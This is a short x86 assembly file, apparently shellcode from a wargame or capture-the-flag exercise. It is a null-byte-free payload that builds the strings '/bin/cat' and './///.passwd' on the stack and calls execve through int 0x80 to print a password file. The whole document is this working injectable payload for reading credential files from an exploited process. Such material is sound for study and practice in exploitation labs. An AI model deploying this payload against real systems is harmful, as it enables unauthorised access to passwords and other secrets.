#execve("/bin/cat",{"/bin/cat",".////.passwd",NULL},NULL)

.global _start
_start:
	xor %edx,%edx
	push %edx
	push $0x7461632f
	push $0x6e69622f
	mov %esp,%ebx
	
	push %edx
	push $0x64777373
	push $0x61702e2f
	push $0x2f2f2f2e
	mov %esp,%eax
	push %edx
	push %eax
	push %ebx
	mov %esp,%ecx
	
	lea 0xb(%edx),%eax
	
	int $0x80
